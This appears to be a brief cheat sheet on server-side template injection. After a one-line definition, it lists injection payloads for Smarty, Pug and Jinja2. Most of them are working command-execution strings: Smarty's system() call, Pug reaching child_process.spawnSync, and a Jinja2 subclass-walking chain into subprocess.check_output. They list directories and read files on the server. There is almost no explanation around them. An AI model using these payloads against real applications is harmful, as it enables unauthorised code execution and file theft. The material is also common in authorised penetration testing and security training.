## Server Side Template Injection
is a vulnerability that occurs when user input is unsafely incorporated into a server-side template.

**Common Template Engines**
-  Jinja2
-  Twig
-  Pug/Jade

### php - Smarty

Commands:
  -  {'Hello'|upper}
  -  {system("ls")}
  -  {system("cat file.txt")}

### NodeJS - Pug

Commands:
  -  #{7*7}
  -  #{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}
  -  #{root.process.mainModule.require('child_process').spawnSync('cat', ['file.txt']).stdout}

### Python - Jinja2

Commands:
  -  {{7*7}}
  -  {{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}
  -  {{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['cat', 'file.txt'])}}
